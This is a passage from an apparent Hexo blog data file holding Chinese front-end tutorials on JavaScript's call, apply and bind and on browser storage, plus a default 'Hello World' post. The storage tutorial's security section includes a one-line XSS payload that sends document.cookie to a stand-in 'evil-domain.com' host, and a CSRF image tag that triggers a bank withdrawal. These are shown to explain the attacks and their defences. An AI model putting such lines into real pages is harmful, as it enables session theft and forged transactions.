class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function isArray(obj) &#123;</span><br><span class=\"line\">  return Object.prototype.toString.call(obj) == &#x27;[object Array]&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">console.log(isArray([])); // true</span><br><span class=\"line\">console.log(isArray(&#x27;qianduan&#x27;)); //false</span><br><span class=\"line\"></span><br><span class=\"line\">// toString()方法允许被修改，以上假定未被修改</span><br><span class=\"line\">// toString()为Object的原型方法，而Array，function等类型作为Object的实例，都重写了toString方法。</span><br><span class=\"line\">// 不同的对象类型调用toString方法时，调用的是对应的重写之后的toString方法（function类型返回内容为函数体的字符串，Array类型返回元素组成的字符串），</span><br><span class=\"line\">// 而不会去调用Object上原型toString方法（返回对象的具体类型），所以采用obj.toString()不能得到其对象类型，只能将obj转化为字符串类型；</span><br><span class=\"line\">// 因此，在想要得到对象的具体类型时，应该调用Object上原型toString方法。</span><br><span class=\"line\"></span><br><span class=\"line\">function isArray1(obj) &#123;</span><br><span class=\"line\">  return Object.prototype.toString.apply(obj) == &#x27;[object Array]&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">console.log(isArray1([])); // true</span><br><span class=\"line\">console.log(isArray1(&#x27;qianduan&#x27;)); //false</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>构造继承</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function Animal(name, age) &#123;</span><br><span class=\"line\">  this.name = name;</span><br><span class=\"line\">  this.age = age;</span><br><span class=\"line\">  //   console.log(this); // 指向全局</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function Dog() &#123;</span><br><span class=\"line\">  // 继承自Animal</span><br><span class=\"line\">  // 方法是 将Animal函数在Dog中调用一下，但是Animal中this的指向全局</span><br><span class=\"line\">  //   Animal();</span><br><span class=\"line\">  //   console.log(this); // Dog &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  //   需要调用apply，改变this指向Dog,这样Dog就继承了Animal的name和age</span><br><span class=\"line\">  Animal.apply(this, [&#x27;cat&#x27;, &#x27;5&#x27;]);</span><br><span class=\"line\">  // Animal.call(this, &#x27;cat&#x27;, &#x27;5&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">  //   console.log(this); // Dog &#123; name: &#x27;cat&#x27;, age: &#x27;5&#x27; &#125;</span><br><span class=\"line\">  this.say = function() &#123;</span><br><span class=\"line\">    console.log(this.name + &#x27;:&#x27; + this.age);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">var dog = new Dog();</span><br><span class=\"line\">dog.say(); //cat:5</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"bind-bind-方法创建一个新的函数，在调用时设置-this-关键字为提供的值。并在调用新函数时，将给定参数列表作为原函数的参数序列的前若干项。\"><a href=\"#bind-bind-方法创建一个新的函数，在调用时设置-this-关键字为提供的值。并在调用新函数时，将给定参数列表作为原函数的参数序列的前若干项。\" class=\"headerlink\" title=\"bind bind()方法创建一个新的函数，在调用时设置 this 关键字为提供的值。并在调用新函数时，将给定参数列表作为原函数的参数序列的前若干项。\"></a><strong>bind</strong> bind()方法创建一个新的函数，在调用时设置 this 关键字为提供的值。并在调用新函数时，将给定参数列表作为原函数的参数序列的前若干项。</h3><p><strong>function.bind(thisArg[, arg1[, arg2[, …]]])</strong></p>\n<ul>\n<li>thisArg 调用绑定函数时作为 this 参数传递给目标函数的值。 如果使用 new 运算符构造绑定函数，则忽略该值。当使用 bind 在 setTimeout 中创建一个函数（作为回调提供）时，作为 thisArg 传递的任何原始值都将转换为 object。如果 bind 函数的参数列表为空，执行作用域的 this 将被视为新函数的 thisArg。</li>\n<li>argsArray 当目标函数被调用时，预先添加到绑定函数的参数列表中的参数。</li>\n<li>ES6 新增的方法，这个方法会返回一个新的函数（函数调用的方式），调用新的函数，会将原始函数的方法当做传入对象的方法使用，传入新函数的任何参数也会一并传入原始函数。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function f(x) &#123;</span><br><span class=\"line\">  this.a = 1;</span><br><span class=\"line\">  this.b = function() &#123;</span><br><span class=\"line\">    return this.a + x;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var obj = &#123;</span><br><span class=\"line\">  a: 10</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">var newObj = new (f.bind(obj, 2))(); //传入了一个实参2</span><br><span class=\"line\">console.log(newObj.a); [注释]: &lt;&gt; 输出 1, 说明返回的函数用作构造函数时obj(this的值)被忽略了</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(newObj.b()); [注释]: &lt;&gt; 输出3 ，说明传入的实参2传入了原函数original</span><br></pre></td></tr></table></figure>\n"},{"title":"Hello World","_content":"\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n```bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n```bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n```bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n```bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\ntags:\n  - 教程\n---\n\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n```bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n```bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n```bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n```bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n","slug":"hello-world","published":1,"date":"2022-02-23T05:42:13.180Z","updated":"2022-02-23T03:09:02.869Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckzz950cw000an0w1csenfjxd","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\">Deployment</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/deployment.html\">Deployment</a></p>\n"},{"title":"test","date":"2022-02-23T05:59:03.000Z","_content":"","source":"_posts/test.md","raw":"---\ntitle: test\ndate: 2022-02-23 13:59:03\ntags:\n---\n","slug":"test","published":1,"updated":"2022-02-23T05:59:03.650Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckzz950cw000bn0w116lfe432","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"关于浏览器存储","date":"2019-04-08T01:42:43.000Z","_content":"\n# 浏览器存储有哪些？\n\n- Cookie\n- LocalStorage\n- SessionStorage\n- IndexDB\n\n# Cookie\n\n### 1.Cookie 的来源\n\n**Cookie 的本职工作并非本地存储，而是“维持状态”。**\n因为 **HTTP 协议是无状态的，HTTP 协议自身不对请求和响应之间的通信状态进行保存**，通俗来说，服务器不知道用户上一次做了什么，这严重阻碍了交互式 Web 应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于 HTTP 的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么，于是就诞生了 Cookie。它就是用来绕开 HTTP 的无状态性的“额外手段”之一。服务器可以设置或读取 Cookies 中包含信息，借此维护用户跟服务器会话中的状态。\n\n我们可以把 Cookie 理解为一个存储在浏览器里的一个小小的文本文件，它附着在 HTTP 请求上，在浏览器和服务器之间“飞来飞去”。它可以携带用户信息，当服务器检查 Cookie 的时候，便可以获取到客户端的状态。\n\n在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段 Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把 Cookie 发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段 Cookie 里追加新的商品信息。结帐时，服务器读取发送来的 Cookie 就行了。\n\n### 2.什么是 Cookie 以及应用场景\n\nHTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。\nCookie 是一个请求首部，其中含有先前由服务器通过 Set-Cookie 首部投放并存储到客户端的 HTTP cookies。\n**Cookie 指某些网站为了辨别用户身份而储存在用户本地终端上的数据(通常经过加密)。 cookie 是服务端生成，客户端进行维护和存储**。通过 cookie,可以让服务器知道请求是来源哪个客户端，就可以进行客户端状态的维护，比如登陆后刷新，请求头就会携带登陆时 response header 中的 set-cookie,Web 服务器接到请求时也能读出 cookie 的值，根据 cookie 值的内容就可以判断和恢复一些用户的信息状态。\n\n  <!-- 典型的应用场景有：\n\n  - 记住密码，下次自动登录。\n  - 购物车功能。\n  - 记录用户浏览数据，进行商品（广告）推荐。 -->\n\nCookie 主要用于以下三个方面：\n\n- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）\n- 个性化设置（如用户自定义设置、主题等）\n- 浏览器行为跟踪（如跟踪分析用户行为等）\n\n### 3.Cookie 的原理以及如何生成\n\n第一次访问网站的时候，浏览器发出请求，服务器响应请求后，会在响应头里面添加一个 Set-Cookie 选项，将 cookie 放入到响应请求中，在浏览器第二次发请求的时候，会通过 Cookie 请求头部将 Cookie 信息发送给服务器，服务端会辨别用户身份，另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。\n\nCookie 的生成方式主要有两种：\n\n- 生成方式一：http response header 中的 set-cookie\n\n我们可以通过响应头里的 Set-Cookie 指定要存储的 Cookie 值。默认情况下，domain 被设置为设置 Cookie 页面的主机名，我们也可以手动设置 domain 的值。\n服务器通过该头部告知客户端保存 Cookie 信息。\n\n```\nHTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n[页面内容]\n\n```\n\n现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的 Cookie 信息通过 Cookie 请求头部再发送给服务器。\n\n```\nGET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry\n\n```\n\n##### 会话期 Cookie\n\n会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期 Cookie 不需要指定过期时间（Expires）或者有效期（Max-Age）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期 Cookie 也会被保留下来，就好像浏览器从来没有关闭一样。\n\n##### 持久性 Cookie\n\n和关闭浏览器便失效的会话期 Cookie 不同，持久性 Cookie 可以指定一个特定的过期时间（Expires）或有效期（Max-Age）。\n\n```\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n```\n\n**Tips:** 当 Cookie 的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。\n\n#### Cookie 的 Secure 和 HttpOnly 标记\n\nHttpOnly 不支持读写，浏览器不允许脚本操作 document.cookie 去更改 cookie， 所以为避免跨域脚本 (XSS) 攻击，通过 JavaScript 的 Document.cookie API 无法访问带有 HttpOnly 标记的 Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 HttpOnly 标记。\n\n```\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly\n```\n\n标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http:）无法使用 Cookie 的 Secure 标记。\n\n- 生成方式二：js 中可以通过 document.cookie 可以读写 cookie，以键值对的形式展示\n\n例如我们在百度首页控制台输入以下三句代码，便可以在 Chrome 的 Application 面板查看生成的 cookie:\n\n```\ndocument.cookie=\"name=hello\";\ndocument.cookie=\"age=18\";\ndocument.cookie=\"domain=google.com;gender=male\"\n```\n\n![code](关于浏览器存储/code.png)\n查看结果\n![cookie](关于浏览器存储/cookie.png)\n\n从上图中我们可以得出：\n\n##### Cookie 的作用域\n\nDomain 和 Path 标识定义了 Cookie 的作用域：即 Cookie 应该发送给哪些 URL。\nDomain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。\n\n**Domain 标识指定了哪些域名可以接受 Cookie。如果没有设置 domain，就会自动绑定到执行语句的当前域**。 如果设置为”.google.com”,则所有以”google.com”结尾的域名都可以访问该 Cookie，所以在百度首页上读取不到第三条代码存储 Cookie 值。\n\n当将域名设置为当前执行语句的域名时，就可以看见该条记录\n![code1](关于浏览器存储/code.png)\n查看结果\n![cookie1](关于浏览器存储/cookie.png)\n\n### 4.Cookie 的缺陷\n\n- Cookie 不够大\n  Cookie 的大小限制在 4KB 左右，对于复杂的存储需求来说是不够用的。当 Cookie 超过 4KB 时，它将面临被裁切的命运。这样看来，Cookie 只能用来存取少量的信息。此外很多浏览器对一个站点的 cookie 个数也是有限制的。\n  这里需注意：各浏览器的 cookie **每一个 name=value 的 value 值大概在 4k**，所以 4k 并不是一个域名下所有的 cookie 共享的,而是一个 name 的大小。\n\n- 过多的 Cookie 会带来巨大的性能浪费\n  Cookie 是紧跟域名的。**同一个域名下的所有请求，都会携带 Cookie**。大家试想，如果我们此刻仅仅是请求一张图片或者一个 CSS 文件，我们也要携带一个 Cookie 跑来跑去（关键是 Cookie 里存储的信息并不需要），这是一件多么劳民伤财的事情。Cookie 虽然小，请求却可以有很多，随着请求的叠加，这样的不必要的 Cookie 带来的开销将是无法想象的。\n  cookie 是用来维护用户信息的，而域名(domain)下所有请求都会携带 cookie，但对于静态文件的请求，携带 cookie 信息根本没有用，此时可以通过 cdn（存储静态文件的）的域名和主站的域名分开来解决。\n\n- 安全问题\n  由于在 HTTP 请求中的 Cookie 是明文传递的，所以安全性成问题，除非用 HTTPS。\n\n### 5.Cookie 与安全\n\n**tips:** 当机器处于不安全环境时，切记不能通过 HTTP Cookie 存储、传输敏感信息\n\n- 会话劫持和跨站脚本攻击（XSS）\n  在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 XSS 攻击。\n\n```\n(new Image()).src = \"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document.cookie;\n```\n\n- 跨站请求伪造（CSRF）\n  比如在不安全聊天室或论坛上的一张图片，当你访问这张图片，它实际上是一个给你银行服务器发送提现的请求：\n  当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。\n\n```\n<img src=\"http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory\">\n```\n\n有一些方法可以阻止此类事件的发生：\n\n- 对用户输入进行过滤来阻止 XSS；\n- 任何敏感操作都需要确认；\n- 用于敏感信息的 Cookie 只能拥有较短的生命周期；\n\n为了弥补 Cookie 的局限性，让“专业的人做专业的事情”，Web Storage 出现了。\n**HTML5 中新增了本地存储的解决方案----Web Storage，它分成两类：sessionStorage 和 localStorage。**这样有了 WebStorage 后，cookie 能只做它应该做的事情了——作为客户端与服务器交互的通道，保持客户端状态。\n\n# LocalStorage\n\n## 1.LocalStorage 的特点\n\n- 保存的数据长期存在，下一次访问该网站的时候，网页可以直接读取以前保存的数据。\n- 大小为 5M 左右\n- 仅在客户端使用，不和服务端进行通信\n- 接口封装较好\n\n## 2.存入/读取/删除数据\n\nlocalStorage 保存的数据，以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。 存入数据使用 setItem 方法。它接受两个参数，第一个是键名，第二个是保存的数据。 localStorage.setItem(\"key\",\"value\");读取数据使用 getItem 方法。它只有一个参数，就是键名。 var valueLocal=localStorage.getItem(\"key\");\n\n- 存入数据\n  **localStorage.setItem(\"key\", \"value\")**\n  该方法接受一个键名和值作为参数，将会把键值对添加到存储中，如果键名存在，则更新其对应的值。\n\n```\n<script>\nif (window.localStorage) {\n  localStorage.setItem(\"name\", \"hello\");\n  localStorage.setItem(\"age\", 18);\n}\n</script>\n```\n\n- 读取数据\n  **localStorage.getItem(\"key\")**\n  该方法接受一个键名作为参数，返回键名对应的值\n  只需要传入 key 即可\n\n```\nvar name = localStorage.getItem(\"name\");\nvar age = localStorage.getItem(\"age\");\nconsole.log(name) // hello\nconsole.log(age) // 18\n```\n\n- 删除数据\n  **localStorage.removeItem(\"key\");**\n  该方法接受一个键名作为参数，并把该键名从存储中删除。\n  只需要传入 key 即可\n\n```\nlocalStorage.removeItem(\"name\");\nlocalStorage.removeItem(\"age\");\n```\n\n- 移除所有\n  **localStorage.clear();**\n  调用该方法会清空存储中的所有键名。\n  不需要传入参数\n\n```\nlocalStorage.clear();\n```\n\n## 3.使用场景\n\nLocalStorage 在存储方面没有什么特别的限制，理论上 Cookie 无法胜任的、可以用简单的键值对来存取的数据存储任务，都可以交给 LocalStorage 来做。\n\n这里给大家举个例子，考虑到 LocalStorage 的特点之一是持久，有时我们更倾向于用它来存储一些内容稳定的资源。比如图片内容丰富的电商网站会用它来存储 Base64 格式的图片字符串：\n\n# SessionStorage\n\nsessionStorage 保存的数据用于浏览器的一次会话，当会话结束（通常是该窗口关闭），数据被清空；sessionStorage 特别的一点在于，即便是相同域名下的两个页面，只要它们不在同一个浏览器窗口中打开，那么它们的 sessionStorage 内容便无法共享；localStorage 在所有同源窗口中都是共享的；cookie 也是在所有同源窗口中都是共享的。除了保存期限的长短不同，SessionStorage 的属性和方法与 LocalStorage 完全一样。\n\n## 1.sessionStorage 的特点\n\n- 会话级别的浏览器存储\n- 大小为 5M 左右\n- 仅在客户端使用，不和服务端进行通信\n- 接口封装较好\n\n## 2.存入/读取/删除数据\n\nsessionStorage 保存的数据，以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。 存入数据使用 setItem 方法。它接受两个参数，第一个是键名，第二个是保存的数据。 sessionStorage.setItem(\"key\",\"value\");读取数据使用 getItem 方法。它只有一个参数，就是键名。 var valueLocal=sessionStorage.getItem(\"key\");\n\n- 存入数据\n  **sessionStorage.setItem(\"key\", \"value\")**\n  该方法接受一个键名和值作为参数，将会把键值对添加到存储中，如果键名存在，则更新其对应的值。\n\n```\n<script>\nif (window.sessionStorage) {\n  sessionStorage.setItem(\"name\", \"hello\");\n  sessionStorage.setItem(\"age\", 18);\n}\n</script>\n```\n\n- 读取数据\n  **sessionStorage.getItem(\"key\")**\n  该方法接受一个键名作为参数，返回键名对应的值\n  只需要传入 key 即可\n\n```\nvar name = sessionStorage.getItem(\"name\");\nvar age = sessionStorage.getItem(\"age\");\nconsole.log(name) // hello\nconsole.log(age) // 18\n\n```\n\n- 删除数据\n  **sessionStorage.removeItem(\"key\");**\n  该方法接受一个键名作为参数，并把该键名从存储中删除。\n  只需要传入 key 即可\n\n```\nsessionStorage.removeItem(\"name\");\nsessionStorage.removeItem(\"age\");\n```\n\n- 移除所有\n  **sessionStorage.clear();**\n  调用该方法会清空存储中的所有键名。\n  不需要传入参数\n\n```\nsessionStorage.clear();\n```\n\n## 3.使用场景\n\nsessionStorage 更适合用来存储生命周期和它同步的会话级别的信息。这些信息只适用于当前会话，当你开启新的会话时，它也需要相应的更新或释放。比如微博的 sessionStorage 就主要是存储你本次会话的浏览足迹\n\n## **sessionStorage 、localStorage 和 cookie 之间的区别**\n\n- 共同点：都是保存在浏览器端，且都遵循同源策略。\n- 不同点：在于生命周期与作用域的不同\n\n作用域：localStorage 只要在相同的协议、相同的主机名、相同的端口下，就能读取/修改到同一份 localStorage 数据。sessionStorage 比 localStorage 更严苛一点，除了协议、主机名、端口外，还要求在同一窗口（也就是浏览器的标签页）下\n\n生命周期：localStorage 是持久化的本地存储，存储在其中的数据是永远不会过期的，使其消失的唯一办法是手动删除；而 sessionStorage 是临时性的本地存储，它是会话级别的存储，当会话结束（页面被关闭）时，存储内容也随之被释放。\n\nWeb Storage 是一个从定义到使用都非常简单的东西。它使用键值对的形式进行存储，这种模式有点类似于对象，却甚至连对象都不是——它只能存储字符串，要想得到对象，我们还需要先对字符串进行一轮解析。\n\n说到底，Web Storage 是对 Cookie 的拓展，它只能用于存储少量的简单数据。当遇到大规模的、结构复杂的数据时，Web Storage 也爱莫能助了。这时候我们就要清楚我们的终极大 boss——IndexedDB！\n\n# IndexDB\n\n通俗地说，IndexedDB 就是**浏览器提供的本地数据库**，它可以被网页脚本创建和操作。IndexedDB 允许储存大量数据，提供查找接口，还能建立索引。这些都是 LocalStorage 所不具备的。就数据库类型而言，IndexedDB 不属于关系型数据库（不支持 SQL 查询语句），更接近 NoSQL 数据库。\nIndexedDB 是一种低级 API，**用于客户端存储大量结构化数据(包括文件和 blobs)**。该 API 使用索引来实现对该数据的高性能搜索。IndexedDB 是一个运行在浏览器上的非关系型数据库。既然是数据库了，那就不是 5M、10M 这样小打小闹级别了。理论上来说，IndexedDB 是没有存储上限的（一般来说不会小于 250M）。它不仅可以存储字符串，还可以存储二进制数据。\n\n## 1.IndexedDB 的特点\n\n- 键值对储存。\n  IndexedDB 内部采用对象仓库（object store）存放数据。所有类型的数据都可以直接存入，包括 JavaScript 对象。对象仓库中，数据以\"键值对\"的形式保存，每一个数据记录都有对应的主键，主键是独一无二的，不能有重复，否则会抛出一个错误。\n\n- 异步\n  IndexedDB 操作时不会锁死浏览器，用户依然可以进行其他操作，这与 LocalStorage 形成对比，后者的操作是同步的。异步设计是为了防止大量数据的读写，拖慢网页的表现。\n\n- 支持事务。\n  IndexedDB 支持事务（transaction），这意味着一系列操作步骤之中，只要有一步失败，整个事务就都取消，数据库回滚到事务发生之前的状态，不存在只改写一部分数据的情况。\n\n- 同源限制\n  IndexedDB 受到同源限制，每一个数据库对应创建它的域名。网页只能访问自身域名下的数据库，而不能访问跨域的数据库。\n\n- 储存空间大\n  IndexedDB 的储存空间比 LocalStorage 大得多，一般来说不少于 250MB，甚至没有上限。\n\n- 支持二进制储存。\n  IndexedDB 不仅可以储存字符串，还可以储存二进制数据（ArrayBuffer 对象和 Blob 对象）。\n\n## 2.基本概念\n\nIndexedDB 是一个比较复杂的 API，涉及不少概念。它把不同的实体，抽象成一个个对象接口。学习这个 API，就是学习它的各种对象接口。\n\n- 数据库：IDBDatabase 对象\n  数据库是一系列相关数据的容器。每个域名（严格的说，是协议 + 域名 + 端口）都可以新建任意多个数据库。\n  IndexedDB 数据库有版本的概念。同一个时刻，只能有一个版本的数据库存在。如果要修改数据库结构（新增或删除表、索引或者主键），只能通过升级数据库版本完成。\n\n- 对象仓库：IDBObjectStore 对象\n  每个数据库包含若干个对象仓库（object store）。它类似于关系型数据库的表格。\n- 数据记录\n  对象仓库保存的是数据记录。每条记录类似于关系型数据库的行，但是只有主键和数据体两部分。主键用来建立默认的索引，必须是不同的，否则会报错。主键可以是数据记录里面的一个属性，也可以指定为一个递增的整数编号。\n  ```\n  { id: 1, text: 'foo' }\n  ```\n- 索引： IDBIndex 对象\n  为了加速数据的检索，可以在对象仓库里面，为不同的属性建立索引。\n- 事务： 